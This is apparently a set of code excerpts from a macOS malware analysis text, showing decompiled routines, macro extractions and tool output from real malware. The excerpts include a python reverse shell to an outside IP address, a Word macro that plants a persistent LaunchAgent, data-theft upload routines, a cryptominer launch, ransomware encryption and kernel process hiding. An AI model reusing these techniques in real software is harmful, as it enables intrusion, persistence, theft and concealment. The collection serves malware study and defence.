["```\n//string at index 0x51: '/Library/Extensions/LittleSnitch.kext'\n1 path = [paths objectAtIndexedSubscript:0x51]; \n2 if (YES == [NSFileManager.defaultManager fileExistsAtPath:path]) \n{\n   exit(0x0);\n}\n```", "```\n% **class-dump \"Bitdefender Adware Removal Tool\"**\n...\n- (id)getKeychainsFilePath;\n- (id)getInstalledApplicationsList;\n- (id)getRunningProcessList;\n- (id)getLocalIPAddress;\n- (void)saveSystemInfoTo:(id)arg1 withRootUserName:(id)arg2 andRootPassword:(id)arg3;\n- (BOOL)SendCollectedDataTo:(id)arg1 withThisTargetId:(id)arg2;\n```", "```\n\"OS version: Darwin users-Mac.local 16.7.0 Darwin Kernel Version 16.7.0: Thu Jun 15 17:36:27 PDT 2017; root:xnu-3789.70.16~2\\/RELEASE_X86_64 x86_64\",\n\n\"Root Username: \\\"user\\\"\",\n\"Root Password: \\\"hunter2\\\"\",\n...\n[\n\"Applications\\/App%20Store.app\\/\",\n\"Applications\\/Automator.app\\/\",\n\"Applications\\/Calculator.app\\/\",\n\"Applications\\/Calendar.app\\/\",\n\"Applications\\/Chess.app\\/\",\n...\n]\n\"process name is: Dock\\t PID: 254 Run from: file:\\/\\/\\/System\\/Library\\/CoreServices\\/Dock.app\\/Contents\\/MacOS\\/Dock\",\n\"process name is: Spotlight\\t PID: 300 Run from: file:\\/\\/\\/System\\/Library\\/CoreServices\\/Spotlight.app\\/Contents\\/MacOS\\/Spotlight\",\n\"process name is: Safari\\t PID: 972 Run from: file:\\/\\/\\/Applications\\/Safari.app\\/Contents\\/MacOS\\/Safari\"...\n```", "```\n# **olevba -c \"BitcoinMagazine-Quidax_InterviewQuestions_2018.docm\"**\n\nVBA MACRO NewMacros.bas \nin file: word/vbaProject.bin\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n...\npath = Environ(\"HOME\") & \"/../../../../Library/LaunchAgents/~$com.xpnsec.plist\"\narg = \"<?xml version=\"\"1.0\"\" encoding=\"\"UTF-8\"\"?>\\n\" & _\n\"<!DOCTYPE plist PUBLIC \"\"-//Apple//DTD PLIST 1.0//EN\"\" \"\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\">\\n\" & _\n\"<plist version=\"\"1.0\"\">\\n\" & _\n\"<dict>\\n\" & _\n\"<key>Label</key>\\n\" & _\n\"<string>com.xpnsec.sandbox</string>\\n\" & _\n\"<key>ProgramArguments</key>\\n\" & _\n\"<array>\\n\" & _\n\"<string>python</string>\\n\" & _\n\"<string>-c</string>\\n\" & _\n\"<string>\" & payload & \"</string>\" & _\n\"</array>\\n\" & _\n\"<key>RunAtLoad</key>\\n\" & _\n\"<true/>\\n\" & _\n\"</dict>\\n\" & _\n\"</plist>\"\nResult = system(\"echo \"\"\" & arg & \"\"\" > '\" & path & \"'\", \"r\")\n```", "```\nLETMEIN_$$_EXEUTEWITHPRIVILEGES(...) {\n\n  AuthorizationCreate(...);\n  AuthorizationCopyRights(...);\n  AuthorizationExecuteWithPrivileges(..., path2self, ...);\n```", "```\nvoid sub_10000c007(...) {\n\n  auth = [Authenticator sharedAuthenticator];\n   sfAuth = [SFAuthorization authorization]; 1\n\n  [sfAuth obtainWithRight:\"system.preferences\" flags:0x3 error:0x0];\n   [auth authenticateUsingAuthorizationSync:sfAuth]; 2\n  ...\n  attrs = [NSDictionary dictionaryWithObject:@(444o) \n                        forKey:NSFilePosixPermissions]; \n\n  data = [NSData dataWithBytes:\"a\" length:0x1];\n  [UserUtilities createFileWithContents:data \n                       path:@\"/var/db/.AccessibilityAPIEnabled\" attributes:attrs]; 3\n```", "```\n...\n<key>ProgramArguments</key>\n<array>\n  <string>sh</string>\n  <string>-c</string>\n  <string>\n      ~/Library/mdworker/**mdworker**\n      -user walker18@protonmail.ch -xmr\n  </string>\n</array>\n<key>RunAtLoad</key>\n<true/>\n...\n```", "```\n% **./mdworker -help**\n  Usage:\n  minergate-cli [-`<version>`] -user `<email>` [-proxy `<url>`] \n                -`<currency> <threads>` [`<gpu intensity>`] \n```", "```\n#!/bin/bash\nwhile :\ndo\n     python -c 'import socket,subprocess,os; \n\n     s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n   1 s.connect((\"185.243.115.230\",1337)); \n\n     os.dup2(s.fileno(),0); \n     os.dup2(s.fileno(),1); \n   2 os.dup2(s.fileno(),2); \n\n   3 p=subprocess.call([\"/bin/sh\",\"-i\"]);' \n     sleep 5\ndone\n```", "```\nint proc_cmd(char * arg0, ...) {\n\n     bzero(&command, 0x400);\n   1 sprintf(&command, \"%s 2>&1 &\", arg0); \n   2 rax = popen(&command, \"r\"); \n     ...\n}\n```", "```\n% **nm -C Komplex/kextd**\n...\n0000000100001e60 T FileExplorer::executeFile(char const*, unsigned long)\n```", "```\nFileExplorer::executeFile(...) {\n   ...  \n   path = [NSString stringWithFormat:@\"%s/%s\", \n         1 directory, FileExplorer::getFileName()]; \n\n  2 NSTask* task = [[NSTask alloc] init]; \n   [task setLaunchPath:path];\n   [task launch];\n   [task waitUntilExit];\n}\n```", "```\nint memory_exec2(void* bytes, int size, ...) {\n    ...\n    NSCreateObjectFileImageFromMemory(bytes, size, &objectFile); \n    NSLinkModule(objectFile, \"core\", 0x3); \n    ...\n```", "```\n% **./netiquette -list**\n\nusrnode(4897)\n  127.0.0.1 -> flux2key.com:80 (Established)\n\nusrnode(4897)\n  127.0.0.1 -> flux2key.com:80 (Established)\n```", "```\n-[AuthenticationController SendCollectedDataTo:withThisTargetId:](...) {\n   ...\n\n   if (([CUtils hasInternet:0x0] & 0x1 & 0xff) != 0x0) { \n      ...\n      file =\"[@\"/tmp/applist.\"xt\" retain];\n      [CUtils uploadFile:file ToServer:0x0 withTargetId:0x0]; \n      ...\n      }\n}\n```", "```\n+(char)uploadFile:(void *)arg2 ToServer:(void *)arg3 withTargetId:(void *)arg4 {\n    ...\n\n    request = [[NSMutableURLRequest requestWithURL:var_58 cachePolicy:0x0 \n                timeoutInterval:var_50] retain];\n\n    [request setHTTPMethod:@\"POST\"];\n    [request setAllHTTPHeaderFields:var_78];\n    [request setHTTPBody:var_88];\n\n rax = [NSURLConnection sendSynchronousRequest:request\n           returningResponse:0x0 error:&var_A0];\n    ...\n}\n```", "```\nhandle = curl_easy_init(); \n\ncurl_easy_setopt(handle, 0x2727, ...); \ncurl_easy_setopt(handle, 0x4e2b, ...); \ncurl_easy_setopt(handle, 0x2711, ...); \ncurl_easy_setopt(handle, 0x271f, postdata); \n\ncurl_easy_perform(handle); \n```", "```\nvoid startEncrypt(...) {\n...\n  recursive_task(\"/Users\", encrypt_entry, putReadme); \n\n  recursive_task(\"/Volumes\", check_ext_encrypt, putReadme);\n```", "```\nvoid ph_init() {\n\n 1 *ALLPROC_ADDRESS = ksym_resolve_symbol_by_crc32(0x127a88e8); \n\n 2 *LCK_LCK = ksym_resolve_symbol_by_crc32(0xfef1d247); \n   *LCK_MTX_LOCK = ksym_resolve_symbol_by_crc32(0x392ec7ae);\n   *LCK_MTX_UNLOCK = ksym_resolve_symbol_by_crc32(0x2472817c);\n\n   return;\n}\n```", "```\nvoid ph_hide(int targetPID) {\n\n    if (pid == 0x0) return;\n\n    r15 = *ALLPROC_ADDRESS;\n    if (r15 == 0x0) goto return;\n\nSEARCH:\n   rax = proc_pid(r15);\n   rbx = *r15;\n   if (rax == targetPID) goto HIDE;\n\n r15 = rbx;\n   if (rbx != 0x0) goto SEARCH;\n\n   return;\n\nHIDE:\n   r14 = *(r15 + 0x8);\n   (*LCK_MTX_LOCK)(*LCK_LCK);\n   *r14 = rbx;\n   *(rbx + 0x8) = r14;\n   (*LCK_MTX_UNLOCK)(*LCK_LCK);\n   return;\n```"]